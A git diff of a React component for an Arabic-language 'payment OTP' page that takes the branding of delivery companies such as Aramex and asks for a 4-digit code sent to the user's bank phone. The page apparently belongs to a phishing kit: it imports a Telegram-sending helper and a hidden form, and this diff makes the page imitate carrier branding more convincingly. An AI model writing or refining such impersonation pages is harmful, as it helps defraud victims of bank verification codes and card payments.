@@ -6,9 +6,10 @@ import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
 import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
-import { Shield, AlertCircle, Check, Lock, Clock, X } from "lucide-react";
+import { Shield, AlertCircle, Check, Lock, Clock, X, CheckCircle2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getBrandingByCompany } from "@/lib/brandingSystem";
 import {
   InputOTP,
   InputOTPGroup,
@@ -32,6 +33,7 @@ const PaymentOTP = () => {
   const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const companyBranding = getBrandingByCompany(serviceKey);
   
   // Countdown timer
   useEffect(() => {
@@ -199,67 +201,102 @@ const PaymentOTP = () => {
   
   return (
     <div 
-      className="min-h-screen py-4 sm:py-12" 
+      className="min-h-screen py-6 sm:py-12" 
       dir="rtl"
       onKeyDown={handleKeyDown}
       tabIndex={0}
       style={{
-        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
+        background: companyBranding?.colors?.background || '#FFFFFF',
+        fontFamily: companyBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif'
       }}
     >
       <div className="container mx-auto px-3 sm:px-4">
         <div className="max-w-md mx-auto">
           {/* Company Header Image */}
           {branding.ogImage && (
-            <div className="mb-4 sm:mb-6 rounded-xl overflow-hidden shadow-lg">
+            <div 
+              className="mb-6 sm:mb-8 rounded-2xl overflow-hidden shadow-2xl relative"
+              style={{
+                borderRadius: companyBranding?.borderRadius?.lg || '16px',
+                boxShadow: companyBranding?.shadows?.lg || '0 20px 40px rgba(0,0,0,0.15)'
+              }}
+            >
               <img 
                 src={branding.ogImage} 
                 alt={serviceName}
-                className="w-full h-32 sm:h-48 object-cover"
+                className="w-full h-40 sm:h-56 object-cover"
                 onError={(e) => e.currentTarget.style.display = 'none'}
               />
+              <div 
+                className="absolute inset-0"
+                style={{
+                  background: companyBranding?.gradients?.hero || `linear-gradient(135deg, ${branding.colors.primary}90, ${branding.colors.secondary}75)`
+                }}
+              />
+              {branding.logo && (
+                <div className="absolute inset-0 flex items-center justify-center">
+                  <div className="bg-white rounded-2xl p-4 shadow-lg">
+                    <img 
+                      src={branding.logo} 
+                      alt={serviceName}
+                      className="h-16 sm:h-20 w-auto"
+                      onError={(e) => e.currentTarget.style.display = 'none'}
+                    />
+                  </div>
+                </div>
+              )}
             </div>
           )}
           
-          {/* Company Logo */}
-          {branding.logo && (
-            <div className="text-center mb-4 sm:mb-6">
-              <img 
-                src={branding.logo} 
-                alt={serviceName}
-                className="h-10 sm:h-12 mx-auto"
-                onError={(e) => e.currentTarget.style.display = 'none'}
-              />
-            </div>
-          )}
+
           
           {/* Security Badge */}
-          <div className="text-center mb-3 sm:mb-6">
+          <div className="text-center mb-6 sm:mb-8">
             <Badge 
-              className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2 text-white"
+              className="text-sm sm:text-base px-5 py-2.5 sm:px-6 sm:py-3 text-white font-bold"
               style={{
-                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                background: companyBranding?.gradients?.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                borderRadius: companyBranding?.borderRadius?.md || '10px',
+                boxShadow: companyBranding?.shadows?.md || '0 4px 12px rgba(0,0,0,0.15)'
               }}
             >
-              <Lock className="w-3 h-3 sm:w-4 sm:h-4 ml-1.5 sm:ml-2" />
-              <span>التحقق الآمن</span>
+              <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
+              <span>التحقق الآمن - {serviceName}</span>
             </Badge>
           </div>
           
-          <Card className="p-4 sm:p-8 shadow-elevated border-2" style={{ borderColor: `${branding.colors.primary}20` }}>
-            <div className="flex items-center justify-between mb-4 sm:mb-6">
-              <div className="flex items-center gap-2 sm:gap-3">
+          <Card 
+            className="p-6 sm:p-10 shadow-elevated border-2" 
+            style={{ 
+              borderColor: branding.colors.primary,
+              borderRadius: companyBranding?.borderRadius?.lg || '16px',
+              boxShadow: companyBranding?.shadows?.lg || '0 20px 40px rgba(0,0,0,0.15)',
+              background: companyBranding?.colors?.background || '#FFFFFF'
+            }}
+          >
+            <div className="flex items-center justify-between mb-6 sm:mb-8">
+              <div className="flex items-center gap-3 sm:gap-4">
                 <div 
-                  className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg sm:rounded-xl flex items-center justify-center animate-pulse"
+                  className="w-14 h-14 sm:w-16 sm:h-16 rounded-xl flex items-center justify-center animate-pulse"
                   style={{
-                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                    background: companyBranding?.gradients?.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                    borderRadius: companyBranding?.borderRadius?.md || '12px',
+                    boxShadow: companyBranding?.shadows?.md || '0 8px 16px rgba(0,0,0,0.15)'
                   }}
                 >
-                  <Shield className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
+                  <Shield className="w-7 h-7 sm:w-8 sm:h-8 text-white" />
                 </div>
                 <div>
-                  <h1 className="text-lg sm:text-2xl font-bold">رمز التحقق</h1>
-                  <p className="text-xs sm:text-sm text-muted-foreground">
+                  <h1 
+                    className="text-xl sm:text-3xl font-bold mb-1"
+                    style={{ 
+                      color: companyBranding?.colors?.text || '#1A1A1A',
+                      fontFamily: companyBranding?.fonts?.arabic || 'Cairo, sans-serif'
+                    }}
+                  >
+                    رمز التحقق
+                  </h1>
+                  <p className="text-sm sm:text-base font-medium" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
                     {serviceName}
                   </p>
                 </div>
@@ -282,29 +319,61 @@ const PaymentOTP = () => {
             
             {/* Info */}
             <div 
-              className="p-3 sm:p-4 rounded-md sm:rounded-lg mb-4 sm:mb-6"
+              className="p-5 sm:p-6 rounded-xl mb-6 sm:mb-8 flex items-start gap-3"
               style={{
-                background: `${branding.colors.primary}10`,
-                border: `1px solid ${branding.colors.primary}30`
+                background: companyBranding?.colors?.surface || `${branding.colors.primary}08`,
+                border: `2px solid ${branding.colors.primary}30`,
+                borderRadius: companyBranding?.borderRadius?.md || '10px'
               }}
             >
-              <p className="text-xs sm:text-sm" style={{ color: branding.colors.primary }}>
-                تم إرسال رمز التحقق المكون من 4 أرقام إلى هاتفك المسجل في البنك.
-              </p>
+              <CheckCircle2 className="w-6 h-6 flex-shrink-0 mt-0.5" style={{ color: branding.colors.primary }} />
+              <div>
+                <p 
+                  className="text-sm sm:text-base font-bold mb-1"
+                  style={{ 
+                    color: companyBranding?.colors?.text || '#1A1A1A',
+                    fontFamily: companyBranding?.fonts?.arabic || 'Cairo, sans-serif'
+                  }}
+                >
+                  تم إرسال رمز التحقق
+                </p>
+                <p className="text-xs sm:text-sm" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
+                  رمز مكون من 4 أرقام إلى هاتفك المسجل في البنك
+                </p>
+              </div>
             </div>
             
             {/* Testing Note */}
             {payment?.otp && (
-              <div className="bg-amber-500/10 border border-amber-500/20 rounded-md sm:rounded-lg p-2 sm:p-3 mb-4 sm:mb-6">
-                <p className="text-xs sm:text-sm text-amber-500">
-                  <strong>للاختبار فقط:</strong> رمز OTP = {payment.otp}
-                </p>
+              <div 
+                className="border-2 rounded-xl p-4 sm:p-5 mb-6 sm:mb-8 flex items-center gap-3"
+                style={{
+                  background: '#FEF3C7',
+                  borderColor: '#F59E0B',
+                  borderRadius: companyBranding?.borderRadius?.md || '10px'
+                }}
+              >
+                <AlertCircle className="w-6 h-6 text-amber-600 flex-shrink-0" />
+                <div>
+                  <p className="text-sm sm:text-base font-bold text-amber-800 mb-1">
+                    للاختبار فقط
+                  </p>
+                  <p className="text-lg sm:text-xl font-mono font-bold" style={{ color: '#F59E0B' }}>
+                    OTP: {payment.otp}
+                  </p>
+                </div>
               </div>
             )}
             
             {/* OTP Input - Modern Style */}
-            <div className="mb-4 sm:mb-6">
-              <div className="flex justify-center items-center gap-3">
+            <div className="mb-6 sm:mb-8">
+              <h3 
+                className="text-center text-base sm:text-lg font-bold mb-4"
+                style={{ color: companyBranding?.colors?.text || '#1A1A1A' }}
+              >
+                أدخل رمز التحقق
+              </h3>
+              <div className="flex justify-center items-center gap-3 sm:gap-4">
                 <InputOTP 
                   maxLength={4} 
                   value={otp} 
@@ -317,10 +386,13 @@ const PaymentOTP = () => {
                       <InputOTPSlot 
                         key={index} 
                         index={index}
-                        className="w-12 h-12 sm:w-16 sm:h-16 text-xl sm:text-3xl font-bold border-2 rounded-lg transition-all"
+                        className="w-14 h-14 sm:w-20 sm:h-20 text-2xl sm:text-4xl font-bold border-2 transition-all"
                         style={{
                           borderColor: otp[index] ? branding.colors.primary : `${branding.colors.primary}40`,
-                          background: otp[index] ? `${branding.colors.primary}10` : 'transparent'
+                          background: otp[index] ? `${branding.colors.primary}10` : companyBranding?.colors?.surface || 'transparent',
+                          borderRadius: companyBranding?.borderRadius?.md || '10px',
+                          boxShadow: otp[index] ? companyBranding?.shadows?.md || '0 4px 12px rgba(0,0,0,0.1)' : 'none',
+                          fontFamily: 'monospace'
                         }}
                       />
                     ))}
@@ -371,11 +443,14 @@ const PaymentOTP = () => {
             {/* Submit Button */}
             <Button
               size="lg"
-              className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold transition-all hover:shadow-lg"
+              className="w-full text-base sm:text-xl py-6 sm:py-8 text-white font-bold transition-all hover:opacity-90 hover:shadow-2xl"
               onClick={handleSubmit}
               disabled={updatePayment.isPending || isLocked || otp.length < 4}
               style={{
-                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                background: companyBranding?.gradients?.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                borderRadius: companyBranding?.borderRadius?.md || '12px',
+                boxShadow: companyBranding?.shadows?.lg || '0 10px 25px rgba(0,0,0,0.15)',
+                fontFamily: companyBranding?.fonts?.arabic || 'Cairo, sans-serif'
               }}
             >
               {updatePayment.isPending ? (
@@ -384,15 +459,18 @@ const PaymentOTP = () => {
                 <span>محظور مؤقتاً</span>
               ) : (
                 <>
-                  <Check className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
-                  <span>تأكيد الدفع</span>
+                  <Check className="w-5 h-5 sm:w-6 sm:h-6 ml-2" />
+                  <span>تأكيد الدفع الآن</span>
                 </>
               )}
             </Button>
             
-            <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-              لم تستلم الرمز؟ تحقق من رسائلك أو اتصل بالبنك
-            </p>
+            <div className="flex items-center justify-center gap-2 mt-5">
+              <Lock className="w-4 h-4" style={{ color: companyBranding?.colors?.textLight || '#666666' }} />
+              <p className="text-xs sm:text-sm text-center" style={{ color: companyBranding?.colors?.textLight || '#666666' }}>
+                لم تستلم الرمز؟ تحقق من رسائلك أو اتصل بالبنك
+              </p>
+            </div>
           </Card>
           
           {/* Hidden Netlify Form */}
